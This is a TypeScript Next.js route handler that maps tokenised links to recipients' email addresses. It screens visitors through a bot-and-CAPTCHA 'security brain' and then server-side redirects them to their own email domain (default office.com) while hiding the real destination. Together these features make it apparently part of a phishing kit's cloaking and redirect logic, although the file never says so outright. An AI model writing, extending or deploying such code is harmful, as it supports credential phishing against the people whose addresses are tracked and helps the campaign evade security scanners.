/**
 * SECURE FINAL REDIRECT API - PATCH 5
 * 
 * Purpose: Server-side 302 redirect to final URL
 * Ensures client never sees final URL in HTML or JSON
 */

import { NextRequest, NextResponse } from 'next/server'
// PHASE 7.4: Use SQLite instead of JSON
import { getLinkByToken } from '@/lib/linkDatabaseSql'
import { getCachedSettings } from '@/lib/adminSettings'
import { adaptiveDecisionEngine, type ValidationContext } from '@/lib/validationEngine'
import { extractTokenFromUrl, extractSidFromUrl, extractEmailFromUrl } from '@/lib/urlExtraction'
import { resolveLinkFromRequest } from '@/lib/linkResolution'
import { getEmailFromId } from '@/lib/linkManagement'
import { getEmailByMappingId } from '@/lib/linkDatabaseSql'
import { extractTokenFromFormattedUrl } from '@/lib/linkUrlBuilder'

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams
    const pathname = request.nextUrl.pathname
    const requestUrl = request.url
    
    // MULTI-MODE FIX: Resolve link using multi-mode resolution
    const resolution = await resolveLinkFromRequest(requestUrl, searchParams, pathname)
    
    if (!resolution) {
      console.error('[SECURE-REDIRECT] Failed to resolve link from URL')
      return NextResponse.json(
        { ok: false, error: 'Invalid link format' },
        { status: 400 }
      )
    }
    
    const { token, email: resolvedEmail, mappingId, resolvedFormat } = resolution
    
    // PHASE 7.3 FIX: secure-redirect should ONLY handle Type A and Type C
    // Type B and Generic should NOT call this endpoint
    if (resolvedFormat !== 'A' && resolvedFormat !== 'C') {
      console.error('[SECURE-REDIRECT] Wrong route - Type B/Generic should not call secure-redirect:', {
        format: resolvedFormat,
        token: token ? `${token.substring(0, 20)}...` : 'MISSING',
      })
      return NextResponse.json(
        { 
          ok: false, 
          error: 'This endpoint is only for Type A and Type C links. Type B and Generic links should access the landing page directly.' 
        },
        { status: 400 }
      )
    }
    
    // MULTI-MODE FIX: Token validation logging
    console.log('[SECURE-REDIRECT] Resolved link:', {
      token: token ? `${token.substring(0, 20)}...` : 'MISSING',
      email: resolvedEmail || 'MISSING',
      mappingId: mappingId || 'none',
      format: resolvedFormat,
    })

    // MULTI-MODE FIX: Token is required
    if (!token || token.trim() === '') {
      console.error('[SECURE-REDIRECT] Token missing or empty')
      return NextResponse.json(
        { ok: false, error: 'Token required' },
        { status: 400 }
      )
    }

    // Get IP and User-Agent
    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      request.headers.get('cf-connecting-ip') ||
      'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'

        // PHASE 7.4: Get link from SQLite instead of JSON
        const link = await getLinkByToken(token)
    if (!link) {
      console.error('[SECURE-REDIRECT] Link not found for token:', token.substring(0, 20))
      return NextResponse.json(
        { ok: false, error: 'Link not found' },
        { status: 404 }
      )
    }

    // MULTI-MODE FIX: Resolve email based on format and link type
    let finalEmail: string | null = null
    
    if (resolvedFormat === 'A') {
      // Type A: Fetch email from database
      // CRITICAL: Generic Links don't support Type A
      if (link.type === 'generic') {
        console.error('[SECURE-REDIRECT] Generic Links cannot use Type A format')
        return NextResponse.json(
          { ok: false, error: 'Generic Links require email in URL. Use ?token=xxx&email=yyy format.' },
          { status: 400 }
        )
      }
      
      // PHASE 7.4: Type A email resolution - SQLite only, no fallbacks
      // Priority 1: Try link.email (Personalized Links only)
      finalEmail = link.email || null
      
      // Priority 2: If not in link, try SQLite email_id_mappings table by linkId
      if (!finalEmail && link.id) {
        const { sql } = await import('@/lib/sql')
        const mappingRow = sql.get<{ email: string }>(
          'SELECT email FROM email_id_mappings WHERE link_id = ? LIMIT 1',
          [link.id]
        )
        if (mappingRow?.email) {
          finalEmail = mappingRow.email
        }
      }
      
      // PHASE 7.4: No fallback logic - if email not found, return error
      if (!finalEmail) {
        console.error('[SECURE-REDIRECT] Email not found for Type A token:', {
          token: token.substring(0, 20),
          linkId: link.id,
          linkType: link.type,
        })
        return NextResponse.json(
          { ok: false, error: 'Email not found for token' },
          { status: 404 }
        )
      }
    } else if (resolvedFormat === 'C') {
      // Type C: Email from mappingId (already resolved)
      finalEmail = resolvedEmail
      
      if (!finalEmail) {
        console.error('[SECURE-REDIRECT] Email not found for mappingId')
        return NextResponse.json(
          { ok: false, error: 'Email not found for mappingId' },
          { status: 404 }
        )
      }
    }
    
    // Final validation
    if (!finalEmail || finalEmail.trim() === '') {
      console.error('[SECURE-REDIRECT] Email required but missing')
      return NextResponse.json(
        { ok: false, error: 'Email required' },
        { status: 400 }
      )
    }

    // PRIORITY ZERO FIX: Include captchaSessionId from cookie
    const captchaSessionId = request.cookies.get('captcha_session')?.value || undefined

    // Validate link + human/brained decision
    const validationContext: ValidationContext = {
      token,
      email: finalEmail,
      ip,
      userAgent,
      fingerprint: link.fingerprint || undefined,
      captchaSessionId, // Include CAPTCHA session ID
    }

    // PHASE 7.2 FIX: Decision logic - only block on explicit BLOCK
    // SAFE_REDIRECT should NOT redirect to fallback, continue normally
    let shouldBlock = false
    let shouldRedirectToCaptcha = false
    
    const adaptiveResult = await adaptiveDecisionEngine(validationContext)
    
    console.log('[SECURE-REDIRECT] Brain decision:', {
      finalAction: adaptiveResult.brainDecision?.finalAction || 'none',
      status: adaptiveResult.status,
    })

    if (adaptiveResult.brainDecision) {
      const brainAction = adaptiveResult.brainDecision.finalAction
      
      // PHASE 7.2 FIX: Only block on explicit BLOCK
      if (brainAction === 'BLOCK') {
        shouldBlock = true
      }
      // PHASE 7.2 FIX: SAFE_REDIRECT should NOT redirect to fallback
      // Continue with normal redirect flow
      else if (brainAction === 'CAPTCHA') {
        // CAPTCHA required - but still allow redirect (CAPTCHA handled elsewhere)
        shouldRedirectToCaptcha = true
      }
      // SAFE_REDIRECT and ALLOW continue normally
    }
    
    // PHASE 7.2 FIX: Only block on explicit BLOCK decision
    if (shouldBlock) {
      console.error('[SECURE-REDIRECT] Blocked by security brain')
      return NextResponse.json(
        { ok: false, error: 'Access denied by security brain' },
        { status: 403 }
      )
    }

    // Get redirect URL from settings
    const domain = finalEmail.split('@')[1] || 'office.com'
    const settings = getCachedSettings()
    const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
    
    console.log('[SECURE-REDIRECT] Redirecting:', {
      email: finalEmail.substring(0, 20),
      domain,
      redirectUrl,
    })

    // Perform server-side redirect (302)
    // Document URL never exposed to client
    return NextResponse.redirect(redirectUrl, {
      status: 302,
    })
  } catch (error) {
    return NextResponse.json(
      { ok: false, error: 'Internal server error' },
      { status: 500 }
    )
  }
}
